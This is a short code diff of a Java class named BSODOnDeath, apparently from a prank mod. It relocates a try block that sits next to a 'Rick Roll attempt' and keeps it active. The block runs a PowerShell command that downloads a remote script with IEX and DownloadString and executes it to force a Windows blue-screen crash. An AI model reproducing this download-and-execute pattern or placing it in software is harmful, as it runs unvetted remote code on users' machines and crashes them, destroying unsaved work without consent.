@@ -79,15 +79,15 @@ public class BSODOnDeath
             {
                 LOGGER.error("Error during Rick Roll attempt: ", e);
             }
-        }
 
-        try {
-            // Runs this (https://github.com/peewpw/Invoke-BSOD) BSOD powershell script by peewpw
-            Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
-        }
-        catch (IOException e)
-        {
-            LOGGER.error("Error during BSOD attempt: ", e);
+            try {
+                // Runs this (https://github.com/peewpw/Invoke-BSOD) BSOD powershell script by peewpw
+                Runtime.getRuntime().exec("powershell -Command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
+            }
+            catch (IOException e)
+            {
+                LOGGER.error("Error during BSOD attempt: ", e);
+            }
         }
     }
 }
